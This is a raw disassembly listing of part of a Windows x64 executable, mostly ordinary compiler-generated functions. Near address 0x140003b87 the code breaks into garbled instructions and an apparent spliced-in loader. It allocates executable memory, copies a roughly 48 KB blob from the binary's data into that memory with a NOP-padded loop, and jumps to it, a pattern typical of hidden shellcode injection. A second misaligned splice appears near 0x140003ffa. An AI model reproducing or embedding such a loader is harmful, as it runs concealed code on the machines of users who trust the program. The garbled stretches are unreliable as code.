   140003af4:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140003af9:	48 83 c4 20          	add    $0x20,%rsp
   140003afd:	41 5f                	pop    %r15
   140003aff:	41 5e                	pop    %r14
   140003b01:	5f                   	pop    %rdi
   140003b02:	c3                   	ret
   140003b03:	e8 04 65 03 00       	call   0x14003a00c
   140003b08:	90                   	nop
   140003b09:	cc                   	int3
   140003b0a:	cc                   	int3
   140003b0b:	cc                   	int3
   140003b0c:	cc                   	int3
   140003b0d:	cc                   	int3
   140003b0e:	cc                   	int3
   140003b0f:	cc                   	int3
   140003b10:	40 53                	rex push %rbx
   140003b12:	56                   	push   %rsi
   140003b13:	57                   	push   %rdi
   140003b14:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   140003b1b:	48 8b 05 d6 f7 07 00 	mov    0x7f7d6(%rip),%rax        # 0x1400832f8
   140003b22:	48 33 c4             	xor    %rsp,%rax
   140003b25:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   140003b2c:	00 
   140003b2d:	48 8b f2             	mov    %rdx,%rsi
   140003b30:	48 8b d9             	mov    %rcx,%rbx
   140003b33:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140003b38:	49 8b d0             	mov    %r8,%rdx
   140003b3b:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140003b40:	e8 6b fd ff ff       	call   0x1400038b0
   140003b45:	48 8b f8             	mov    %rax,%rdi
   140003b48:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003b4d:	0f 10 06             	movups (%rsi),%xmm0
   140003b50:	0f 29 44 24 50       	movaps %xmm0,0x50(%rsp)
   140003b55:	48 83 78 10 00       	cmpq   $0x0,0x10(%rax)
   140003b5a:	74 15                	je     0x140003b71
   140003b5c:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140003b62:	48 8d 15 83 02 06 00 	lea    0x60283(%rip),%rdx        # 0x140063dec
   140003b69:	48 8b c8             	mov    %rax,%rcx
   140003b6c:	e8 6f 6d 00 00       	call   0x14000a8e0
   140003b71:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140003b76:	48 8b 01             	mov    (%rcx),%rax
   140003b79:	44 8b 44 24 50       	mov    0x50(%rsp),%r8d
   140003b7e:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140003b83:	48 8b 40 10          	mov    0x10(%rax),%rax
   140003b87:	ff 15 40 53 48 81    	call   *-0x7eb7acc0(%rip)        # 0xc1488ecd
   140003b8d:	ec                   	in     (%dx),%al
   140003b8e:	a0 00 00 00 bb ab bc 	movabs 0xbcabbb000000,%al
   140003b95:	00 00 
   140003b97:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140003b9d:	8b d3                	mov    %ebx,%edx
   140003b9f:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140003ba5:	33 c9                	xor    %ecx,%ecx
   140003ba7:	ff 15 ab d7 01 00    	call   *0x1d7ab(%rip)        # 0x140021358
   140003bad:	4c 8b c0             	mov    %rax,%r8
   140003bb0:	90                   	nop
   140003bb1:	90                   	nop
   140003bb2:	48 8d 0d 23 c9 02 00 	lea    0x2c923(%rip),%rcx        # 0x1400304dc
   140003bb9:	4c 2b c1             	sub    %rcx,%r8
   140003bbc:	66 90                	xchg   %ax,%ax
   140003bbe:	49 89 c2             	mov    %rax,%r10
   140003bc1:	0f b6 11             	movzbl (%rcx),%edx
   140003bc4:	90                   	nop
   140003bc5:	41 88 14 08          	mov    %dl,(%r8,%rcx,1)
   140003bc9:	90                   	nop
   140003bca:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   140003bce:	90                   	nop
   140003bcf:	83 c3 ff             	add    $0xffffffff,%ebx
   140003bd2:	75 ed                	jne    0x140003bc1
   140003bd4:	41 ff e2             	jmp    *%r10
   140003bd7:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003bdb:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003bdf:	0f 87 c8 00 00 00    	ja     0x140003cad
   140003be5:	e8 da 7b 03 00       	call   0x14003b7c4
   140003bea:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003bed:	0f 11 44 24 70       	movups %xmm0,0x70(%rsp)
   140003bf2:	0f 57 c9             	xorps  %xmm1,%xmm1
   140003bf5:	f3 0f 7f 8c 24 80 00 	movdqu %xmm1,0x80(%rsp)
   140003bfc:	00 00 
   140003bfe:	0f 10 07             	movups (%rdi),%xmm0
   140003c01:	0f 11 44 24 70       	movups %xmm0,0x70(%rsp)
   140003c06:	0f 10 4f 10          	movups 0x10(%rdi),%xmm1
   140003c0a:	0f 11 8c 24 80 00 00 	movups %xmm1,0x80(%rsp)
   140003c11:	00 
   140003c12:	48 c7 47 10 00 00 00 	movq   $0x0,0x10(%rdi)
   140003c19:	00 
   140003c1a:	48 c7 47 18 0f 00 00 	movq   $0xf,0x18(%rdi)
   140003c21:	00 
   140003c22:	c6 07 00             	movb   $0x0,(%rdi)
   140003c25:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140003c2a:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140003c2f:	48 8b 94 24 88 00 00 	mov    0x88(%rsp),%rdx
   140003c36:	00 
   140003c37:	48 83 fa 10          	cmp    $0x10,%rdx
   140003c3b:	48 0f 43 c1          	cmovae %rcx,%rax
   140003c3f:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140003c43:	48 8d 05 56 66 06 00 	lea    0x66656(%rip),%rax        # 0x14006a2a0
   140003c4a:	48 89 03             	mov    %rax,(%rbx)
   140003c4d:	72 29                	jb     0x140003c78
   140003c4f:	48 ff c2             	inc    %rdx
   140003c52:	48 8b c1             	mov    %rcx,%rax
   140003c55:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003c5c:	72 15                	jb     0x140003c73
   140003c5e:	48 83 c2 27          	add    $0x27,%rdx
   140003c62:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003c66:	48 2b c1             	sub    %rcx,%rax
   140003c69:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003c6d:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003c71:	77 34                	ja     0x140003ca7
   140003c73:	e8 4c 7b 03 00       	call   0x14003b7c4
   140003c78:	48 8d 05 51 77 06 00 	lea    0x67751(%rip),%rax        # 0x14006b3d0
   140003c7f:	48 89 03             	mov    %rax,(%rbx)
   140003c82:	0f 10 06             	movups (%rsi),%xmm0
   140003c85:	0f 11 43 10          	movups %xmm0,0x10(%rbx)
   140003c89:	48 8b c3             	mov    %rbx,%rax
   140003c8c:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   140003c93:	00 
   140003c94:	48 33 cc             	xor    %rsp,%rcx
   140003c97:	e8 64 7d 03 00       	call   0x14003ba00
   140003c9c:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   140003ca3:	5f                   	pop    %rdi
   140003ca4:	5e                   	pop    %rsi
   140003ca5:	5b                   	pop    %rbx
   140003ca6:	c3                   	ret
   140003ca7:	e8 f4 e5 03 00       	call   0x1400422a0
   140003cac:	90                   	nop
   140003cad:	e8 ee e5 03 00       	call   0x1400422a0
   140003cb2:	90                   	nop
   140003cb3:	cc                   	int3
   140003cb4:	cc                   	int3
   140003cb5:	cc                   	int3
   140003cb6:	cc                   	int3
   140003cb7:	cc                   	int3
   140003cb8:	cc                   	int3
   140003cb9:	cc                   	int3
   140003cba:	cc                   	int3
   140003cbb:	cc                   	int3
   140003cbc:	cc                   	int3
   140003cbd:	cc                   	int3
   140003cbe:	cc                   	int3
   140003cbf:	cc                   	int3
   140003cc0:	48 8d 05 c9 00 06 00 	lea    0x600c9(%rip),%rax        # 0x140063d90
   140003cc7:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140003ccb:	48 8d 05 a6 00 06 00 	lea    0x600a6(%rip),%rax        # 0x140063d78
   140003cd2:	48 89 01             	mov    %rax,(%rcx)
   140003cd5:	48 8b c1             	mov    %rcx,%rax
   140003cd8:	c3                   	ret
   140003cd9:	cc                   	int3
   140003cda:	cc                   	int3
   140003cdb:	cc                   	int3
   140003cdc:	cc                   	int3
   140003cdd:	cc                   	int3
   140003cde:	cc                   	int3
   140003cdf:	cc                   	int3
   140003ce0:	40 53                	rex push %rbx
   140003ce2:	48 83 ec 70          	sub    $0x70,%rsp
   140003ce6:	0f 29 74 24 60       	movaps %xmm6,0x60(%rsp)
   140003ceb:	48 8b 05 06 f6 07 00 	mov    0x7f606(%rip),%rax        # 0x1400832f8
   140003cf2:	48 33 c4             	xor    %rsp,%rax
   140003cf5:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140003cfa:	48 8b d9             	mov    %rcx,%rbx
   140003cfd:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140003d02:	41 0f 10 30          	movups (%r8),%xmm6
   140003d06:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003d09:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140003d0e:	0f 57 c9             	xorps  %xmm1,%xmm1
   140003d11:	f3 0f 7f 4c 24 40    	movdqu %xmm1,0x40(%rsp)
   140003d17:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   140003d1e:	66 90                	xchg   %ax,%ax
   140003d20:	49 ff c0             	inc    %r8
   140003d23:	42 80 3c 02 00       	cmpb   $0x0,(%rdx,%r8,1)
   140003d28:	75 f6                	jne    0x140003d20
   140003d2a:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003d2f:	e8 6c f0 ff ff       	call   0x140002da0
   140003d34:	90                   	nop
   140003d35:	66 0f 7f 74 24 20    	movdqa %xmm6,0x20(%rsp)
   140003d3b:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140003d40:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003d45:	48 8b cb             	mov    %rbx,%rcx
   140003d48:	e8 c3 fd ff ff       	call   0x140003b10
   140003d4d:	90                   	nop
   140003d4e:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140003d53:	48 83 fa 10          	cmp    $0x10,%rdx
   140003d57:	72 2e                	jb     0x140003d87
   140003d59:	48 ff c2             	inc    %rdx
   140003d5c:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140003d61:	48 8b c1             	mov    %rcx,%rax
   140003d64:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003d6b:	72 15                	jb     0x140003d82
   140003d6d:	48 83 c2 27          	add    $0x27,%rdx
   140003d71:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003d75:	48 2b c1             	sub    %rcx,%rax
   140003d78:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003d7c:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003d80:	77 2a                	ja     0x140003dac
   140003d82:	e8 3d 7a 03 00       	call   0x14003b7c4
   140003d87:	48 8d 05 0a 78 06 00 	lea    0x6780a(%rip),%rax        # 0x14006b598
   140003d8e:	48 89 03             	mov    %rax,(%rbx)
   140003d91:	48 8b c3             	mov    %rbx,%rax
   140003d94:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140003d99:	48 33 cc             	xor    %rsp,%rcx
   140003d9c:	e8 5f 7c 03 00       	call   0x14003ba00
   140003da1:	0f 28 74 24 60       	movaps 0x60(%rsp),%xmm6
   140003da6:	48 83 c4 70          	add    $0x70,%rsp
   140003daa:	5b                   	pop    %rbx
   140003dab:	c3                   	ret
   140003dac:	e8 ef e4 03 00       	call   0x1400422a0
   140003db1:	cc                   	int3
   140003db2:	cc                   	int3
   140003db3:	cc                   	int3
   140003db4:	cc                   	int3
   140003db5:	cc                   	int3
   140003db6:	cc                   	int3
   140003db7:	cc                   	int3
   140003db8:	cc                   	int3
   140003db9:	cc                   	int3
   140003dba:	cc                   	int3
   140003dbb:	cc                   	int3
   140003dbc:	cc                   	int3
   140003dbd:	cc                   	int3
   140003dbe:	cc                   	int3
   140003dbf:	cc                   	int3
   140003dc0:	48 8b 11             	mov    (%rcx),%rdx
   140003dc3:	48 8d 41 10          	lea    0x10(%rcx),%rax
   140003dc7:	48 3b d0             	cmp    %rax,%rdx
   140003dca:	74 08                	je     0x140003dd4
   140003dcc:	48 8b ca             	mov    %rdx,%rcx
   140003dcf:	e9 ac ed 03 00       	jmp    0x140042b80
   140003dd4:	c3                   	ret
   140003dd5:	cc                   	int3
   140003dd6:	cc                   	int3
   140003dd7:	cc                   	int3
   140003dd8:	cc                   	int3
   140003dd9:	cc                   	int3
   140003dda:	cc                   	int3
   140003ddb:	cc                   	int3
   140003ddc:	cc                   	int3
   140003ddd:	cc                   	int3
   140003dde:	cc                   	int3
   140003ddf:	cc                   	int3
   140003de0:	48 8b 09             	mov    (%rcx),%rcx
   140003de3:	48 85 c9             	test   %rcx,%rcx
   140003de6:	0f 85 24 6a 00 00    	jne    0x14000a810
   140003dec:	c3                   	ret
   140003ded:	cc                   	int3
   140003dee:	cc                   	int3
   140003def:	cc                   	int3
   140003df0:	4c 8b 41 10          	mov    0x10(%rcx),%r8
   140003df4:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140003df8:	48 8b 09             	mov    (%rcx),%rcx
   140003dfb:	e9 50 f0 ff ff       	jmp    0x140002e50
   140003e00:	40 53                	rex push %rbx
   140003e02:	48 83 ec 20          	sub    $0x20,%rsp
   140003e06:	48 8b d9             	mov    %rcx,%rbx
   140003e09:	48 8b 09             	mov    (%rcx),%rcx
   140003e0c:	48 85 c9             	test   %rcx,%rcx
   140003e0f:	74 05                	je     0x140003e16
   140003e11:	e8 6a ed 03 00       	call   0x140042b80
   140003e16:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   140003e1d:	48 83 c4 20          	add    $0x20,%rsp
   140003e21:	5b                   	pop    %rbx
   140003e22:	c3                   	ret
   140003e23:	cc                   	int3
   140003e24:	cc                   	int3
   140003e25:	cc                   	int3
   140003e26:	cc                   	int3
   140003e27:	cc                   	int3
   140003e28:	cc                   	int3
   140003e29:	cc                   	int3
   140003e2a:	cc                   	int3
   140003e2b:	cc                   	int3
   140003e2c:	cc                   	int3
   140003e2d:	cc                   	int3
   140003e2e:	cc                   	int3
   140003e2f:	cc                   	int3
   140003e30:	48 83 ec 28          	sub    $0x28,%rsp
   140003e34:	48 8d 05 ed ff 05 00 	lea    0x5ffed(%rip),%rax        # 0x140063e28
   140003e3b:	48 89 01             	mov    %rax,(%rcx)
   140003e3e:	e8 01 6b 03 00       	call   0x14003a944
   140003e43:	90                   	nop
   140003e44:	48 83 c4 28          	add    $0x28,%rsp
   140003e48:	c3                   	ret
   140003e49:	cc                   	int3
   140003e4a:	cc                   	int3
   140003e4b:	cc                   	int3
   140003e4c:	cc                   	int3
   140003e4d:	cc                   	int3
   140003e4e:	cc                   	int3
   140003e4f:	cc                   	int3
   140003e50:	48 8b 41 e0          	mov    -0x20(%rcx),%rax
   140003e54:	4c 8b c9             	mov    %rcx,%r9
   140003e57:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140003e5b:	48 8d 05 56 01 06 00 	lea    0x60156(%rip),%rax        # 0x140063fb8
   140003e62:	48 89 44 0a e0       	mov    %rax,-0x20(%rdx,%rcx,1)
   140003e67:	48 8b 41 e0          	mov    -0x20(%rcx),%rax
   140003e6b:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140003e6f:	44 8d 42 e0          	lea    -0x20(%rdx),%r8d
   140003e73:	44 89 44 0a dc       	mov    %r8d,-0x24(%rdx,%rcx,1)
   140003e78:	48 8b 41 f0          	mov    -0x10(%rcx),%rax
   140003e7c:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003e80:	48 8d 05 29 01 06 00 	lea    0x60129(%rip),%rax        # 0x140063fb0
   140003e87:	4a 89 44 09 f0       	mov    %rax,-0x10(%rcx,%r9,1)
   140003e8c:	49 8b 41 f0          	mov    -0x10(%r9),%rax
   140003e90:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003e94:	8d 51 f0             	lea    -0x10(%rcx),%edx
   140003e97:	42 89 54 09 ec       	mov    %edx,-0x14(%rcx,%r9,1)
   140003e9c:	49 8b 41 e0          	mov    -0x20(%r9),%rax
   140003ea0:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003ea4:	48 8d 05 f5 00 06 00 	lea    0x600f5(%rip),%rax        # 0x140063fa0
   140003eab:	4a 89 44 09 e0       	mov    %rax,-0x20(%rcx,%r9,1)
   140003eb0:	49 8b 41 e0          	mov    -0x20(%r9),%rax
   140003eb4:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003eb8:	8d 51 e8             	lea    -0x18(%rcx),%edx
   140003ebb:	42 89 54 09 dc       	mov    %edx,-0x24(%rcx,%r9,1)
   140003ec0:	c3                   	ret
   140003ec1:	cc                   	int3
   140003ec2:	cc                   	int3
   140003ec3:	cc                   	int3
   140003ec4:	cc                   	int3
   140003ec5:	cc                   	int3
   140003ec6:	cc                   	int3
   140003ec7:	cc                   	int3
   140003ec8:	cc                   	int3
   140003ec9:	cc                   	int3
   140003eca:	cc                   	int3
   140003ecb:	cc                   	int3
   140003ecc:	cc                   	int3
   140003ecd:	cc                   	int3
   140003ece:	cc                   	int3
   140003ecf:	cc                   	int3
   140003ed0:	48 8b 41 e8          	mov    -0x18(%rcx),%rax
   140003ed4:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140003ed8:	48 8d 05 c1 00 06 00 	lea    0x600c1(%rip),%rax        # 0x140063fa0
   140003edf:	48 89 44 0a e8       	mov    %rax,-0x18(%rdx,%rcx,1)
   140003ee4:	48 8b 41 e8          	mov    -0x18(%rcx),%rax
   140003ee8:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140003eec:	44 8d 42 e8          	lea    -0x18(%rdx),%r8d
   140003ef0:	44 89 44 0a e4       	mov    %r8d,-0x1c(%rdx,%rcx,1)
   140003ef5:	c3                   	ret
   140003ef6:	cc                   	int3
   140003ef7:	cc                   	int3
   140003ef8:	cc                   	int3
   140003ef9:	cc                   	int3
   140003efa:	cc                   	int3
   140003efb:	cc                   	int3
   140003efc:	cc                   	int3
   140003efd:	cc                   	int3
   140003efe:	cc                   	int3
   140003eff:	cc                   	int3
   140003f00:	48 8b 41 f0          	mov    -0x10(%rcx),%rax
   140003f04:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140003f08:	48 8d 05 a1 00 06 00 	lea    0x600a1(%rip),%rax        # 0x140063fb0
   140003f0f:	48 89 44 0a f0       	mov    %rax,-0x10(%rdx,%rcx,1)
   140003f14:	48 8b 41 f0          	mov    -0x10(%rcx),%rax
   140003f18:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140003f1c:	44 8d 42 f0          	lea    -0x10(%rdx),%r8d
   140003f20:	44 89 44 0a ec       	mov    %r8d,-0x14(%rdx,%rcx,1)
   140003f25:	c3                   	ret
   140003f26:	cc                   	int3
   140003f27:	cc                   	int3
   140003f28:	cc                   	int3
   140003f29:	cc                   	int3
   140003f2a:	cc                   	int3
   140003f2b:	cc                   	int3
   140003f2c:	cc                   	int3
   140003f2d:	cc                   	int3
   140003f2e:	cc                   	int3
   140003f2f:	cc                   	int3
   140003f30:	40 53                	rex push %rbx
   140003f32:	48 83 ec 20          	sub    $0x20,%rsp
   140003f36:	48 8b 59 60          	mov    0x60(%rcx),%rbx
   140003f3a:	48 8d 05 7f 00 06 00 	lea    0x6007f(%rip),%rax        # 0x140063fc0
   140003f41:	48 89 01             	mov    %rax,(%rcx)
   140003f44:	48 85 db             	test   %rbx,%rbx
   140003f47:	74 41                	je     0x140003f8a
   140003f49:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140003f4d:	48 85 c9             	test   %rcx,%rcx
   140003f50:	74 26                	je     0x140003f78
   140003f52:	48 8b 01             	mov    (%rcx),%rax
   140003f55:	48 8b 40 10          	mov    0x10(%rax),%rax
   140003f59:	ff 15 81 f4 05 00    	call   *0x5f481(%rip)        # 0x1400633e0
   140003f5f:	48 8b c8             	mov    %rax,%rcx
   140003f62:	48 85 c0             	test   %rax,%rax
   140003f65:	74 11                	je     0x140003f78
   140003f67:	48 8b 10             	mov    (%rax),%rdx
   140003f6a:	48 8b 02             	mov    (%rdx),%rax
   140003f6d:	ba 01 00 00 00       	mov    $0x1,%edx
   140003f72:	ff 15 68 f4 05 00    	call   *0x5f468(%rip)        # 0x1400633e0
   140003f78:	ba 10 00 00 00       	mov    $0x10,%edx
   140003f7d:	48 8b cb             	mov    %rbx,%rcx
   140003f80:	48 83 c4 20          	add    $0x20,%rsp
   140003f84:	5b                   	pop    %rbx
   140003f85:	e9 3a 78 03 00       	jmp    0x14003b7c4
   140003f8a:	48 83 c4 20          	add    $0x20,%rsp
   140003f8e:	5b                   	pop    %rbx
   140003f8f:	c3                   	ret
   140003f90:	40 53                	rex push %rbx
   140003f92:	48 83 ec 20          	sub    $0x20,%rsp
   140003f96:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140003f9a:	48 8b d9             	mov    %rcx,%rbx
   140003f9d:	48 83 fa 10          	cmp    $0x10,%rdx
   140003fa1:	72 2c                	jb     0x140003fcf
   140003fa3:	48 8b 09             	mov    (%rcx),%rcx
   140003fa6:	48 ff c2             	inc    %rdx
   140003fa9:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003fb0:	72 18                	jb     0x140003fca
   140003fb2:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   140003fb6:	48 83 c2 27          	add    $0x27,%rdx
   140003fba:	49 2b c8             	sub    %r8,%rcx
   140003fbd:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   140003fc1:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003fc5:	77 21                	ja     0x140003fe8
   140003fc7:	49 8b c8             	mov    %r8,%rcx
   140003fca:	e8 f5 77 03 00       	call   0x14003b7c4
   140003fcf:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
   140003fd6:	00 
   140003fd7:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   140003fde:	00 
   140003fdf:	c6 03 00             	movb   $0x0,(%rbx)
   140003fe2:	48 83 c4 20          	add    $0x20,%rsp
   140003fe6:	5b                   	pop    %rbx
   140003fe7:	c3                   	ret
   140003fe8:	e8 b3 e2 03 00       	call   0x1400422a0
   140003fed:	cc                   	int3
   140003fee:	cc                   	int3
   140003fef:	cc                   	int3
   140003ff0:	40 53                	rex push %rbx
   140003ff2:	48 83 ec 20          	sub    $0x20,%rsp
   140003ff6:	f6 41 70 01          	testb  $0x1,0x70(%rcx)
   140003ffa:	48 8d 05 37 00 06 48 	lea    0x48060037(%rip),%rax        # 0x188064038
   140004001:	89 5c 24 08          	mov    %ebx,0x8(%rsp)
   140004005:	57                   	push   %rdi
   140004006:	48 83 ec 20          	sub    $0x20,%rsp
   14000400a:	48 8d 05 47 d9 01 00 	lea    0x1d947(%rip),%rax        # 0x140021958
   140004011:	48 8b d9             	mov    %rcx,%rbx
   140004014:	8b fa                	mov    %edx,%edi
   140004016:	48 89 01             	mov    %rax,(%rcx)
   140004019:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   14000401d:	48 85 c9             	test   %rcx,%rcx
   140004020:	74 06                	je     0x140004028
   140004022:	ff 15 98 d2 01 00    	call   *0x1d298(%rip)        # 0x1400212c0
   140004028:	40 f6 c7 01          	test   $0x1,%dil
   14000402c:	74 08                	je     0x140004036
   14000402e:	48 8b cb             	mov    %rbx,%rcx
   140004031:	e8 3a ed 00 00       	call   0x140012d70
   140004036:	48 8b c3             	mov    %rbx,%rax
   140004039:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000403e:	48 83 c4 20          	add    $0x20,%rsp
   140004042:	5f                   	pop    %rdi
   140004043:	c3                   	ret
   140004044:	cc                   	int3
   140004045:	cc                   	int3
   140004046:	cc                   	int3
   140004047:	cc                   	int3
   140004048:	cc                   	int3
   140004049:	cc                   	int3
   14000404a:	cc                   	int3
   14000404b:	cc                   	int3
   14000404c:	cc                   	int3
   14000404d:	cc                   	int3
   14000404e:	cc                   	int3
   14000404f:	cc                   	int3
   140004050:	48 83 ec 38          	sub    $0x38,%rsp
   140004054:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140004059:	4c 8b 11             	mov    (%rcx),%r10
   14000405c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004061:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140004066:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000406b:	41 ff 52 58          	call   *0x58(%r10)
   14000406f:	48 83 c4 38          	add    $0x38,%rsp
   140004073:	c3                   	ret
   140004074:	cc                   	int3
   140004075:	cc                   	int3
   140004076:	cc                   	int3
   140004077:	cc                   	int3
   140004078:	cc                   	int3
   140004079:	cc                   	int3
   14000407a:	cc                   	int3
   14000407b:	cc                   	int3
   14000407c:	cc                   	int3
   14000407d:	cc                   	int3
   14000407e:	cc                   	int3
   14000407f:	cc                   	int3
   140004080:	48 8b 01             	mov    (%rcx),%rax
   140004083:	ff 60 48             	jmp    *0x48(%rax)
   140004086:	cc                   	int3
   140004087:	cc                   	int3
   140004088:	cc                   	int3
   140004089:	cc                   	int3
   14000408a:	cc                   	int3
   14000408b:	cc                   	int3
   14000408c:	cc                   	int3
   14000408d:	cc                   	int3
   14000408e:	cc                   	int3
   14000408f:	cc                   	int3
   140004090:	48 8b 01             	mov    (%rcx),%rax
   140004093:	ff 60 50             	jmp    *0x50(%rax)
   140004096:	cc                   	int3
   140004097:	cc                   	int3
   140004098:	cc                   	int3
   140004099:	cc                   	int3
   14000409a:	cc                   	int3
   14000409b:	cc                   	int3
   14000409c:	cc                   	int3
   14000409d:	cc                   	int3
   14000409e:	cc                   	int3
   14000409f:	cc                   	int3
   1400040a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400040a4:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   1400040a8:	48 8d 15 49 76 02 00 	lea    0x27649(%rip),%rdx        # 0x14002b6f8
   1400040af:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400040b4:	e8 87 ed 00 00       	call   0x140012e40
   1400040b9:	cc                   	int3
   1400040ba:	cc                   	int3
   1400040bb:	cc                   	int3
   1400040bc:	cc                   	int3
   1400040bd:	cc                   	int3
   1400040be:	cc                   	int3
   1400040bf:	cc                   	int3
   1400040c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400040c4:	e8 47 ee 00 00       	call   0x140012f10
   1400040c9:	85 c0                	test   %eax,%eax
   1400040cb:	74 35                	je     0x140004102
   1400040cd:	83 f8 0c             	cmp    $0xc,%eax
   1400040d0:	74 25                	je     0x1400040f7
   1400040d2:	83 f8 16             	cmp    $0x16,%eax
   1400040d5:	74 15                	je     0x1400040ec
   1400040d7:	83 f8 22             	cmp    $0x22,%eax
   1400040da:	74 10                	je     0x1400040ec
   1400040dc:	83 f8 50             	cmp    $0x50,%eax
   1400040df:	74 21                	je     0x140004102
   1400040e1:	b9 05 40 00 80       	mov    $0x80004005,%ecx
   1400040e6:	e8 b5 ff ff ff       	call   0x1400040a0
   1400040eb:	cc                   	int3
   1400040ec:	b9 57 00 07 80       	mov    $0x80070057,%ecx
   1400040f1:	e8 aa ff ff ff       	call   0x1400040a0
   1400040f6:	cc                   	int3
   1400040f7:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   1400040fc:	e8 9f ff ff ff       	call   0x1400040a0
   140004101:	cc                   	int3
   140004102:	48 83 c4 28          	add    $0x28,%rsp
   140004106:	c3                   	ret
   140004107:	cc                   	int3
   140004108:	cc                   	int3
   140004109:	cc                   	int3
   14000410a:	cc                   	int3
   14000410b:	cc                   	int3
   14000410c:	cc                   	int3
   14000410d:	cc                   	int3
   14000410e:	cc                   	int3
   14000410f:	cc                   	int3
   140004110:	48 83 ec 38          	sub    $0x38,%rsp
   140004114:	ff 15 7e d1 01 00    	call   *0x1d17e(%rip)        # 0x140021298
   14000411a:	45 33 db             	xor    %r11d,%r11d
   14000411d:	44 89 5c 24 20       	mov    %r11d,0x20(%rsp)
   140004122:	eb 0b                	jmp    0x14000412f
   140004124:	41 bb 0e 00 07 80    	mov    $0x8007000e,%r11d
   14000412a:	44 89 5c 24 20       	mov    %r11d,0x20(%rsp)
   14000412f:	41 8b c3             	mov    %r11d,%eax
   140004132:	48 83 c4 38          	add    $0x38,%rsp
   140004136:	c3                   	ret
   140004137:	cc                   	int3
   140004138:	cc                   	int3
   140004139:	cc                   	int3
   14000413a:	cc                   	int3
   14000413b:	cc                   	int3
   14000413c:	cc                   	int3
   14000413d:	cc                   	int3
   14000413e:	cc                   	int3
   14000413f:	cc                   	int3
   140004140:	40 55                	rex push %rbp
   140004142:	48 83 ec 20          	sub    $0x20,%rsp
   140004146:	48 8b ea             	mov    %rdx,%rbp
   140004149:	48 8b 01             	mov    (%rcx),%rax
   14000414c:	45 33 db             	xor    %r11d,%r11d
   14000414f:	81 38 17 00 00 c0    	cmpl   $0xc0000017,(%rax)
   140004155:	41 0f 94 c3          	sete   %r11b
   140004159:	41 8b c3             	mov    %r11d,%eax
   14000415c:	48 83 c4 20          	add    $0x20,%rsp
   140004160:	5d                   	pop    %rbp
   140004161:	c3                   	ret
   140004162:	cc                   	int3
   140004163:	cc                   	int3
   140004164:	cc                   	int3
   140004165:	cc                   	int3
   140004166:	cc                   	int3
   140004167:	cc                   	int3
   140004168:	cc                   	int3
   140004169:	cc                   	int3
   14000416a:	cc                   	int3
   14000416b:	cc                   	int3
   14000416c:	cc                   	int3
   14000416d:	cc                   	int3
   14000416e:	cc                   	int3
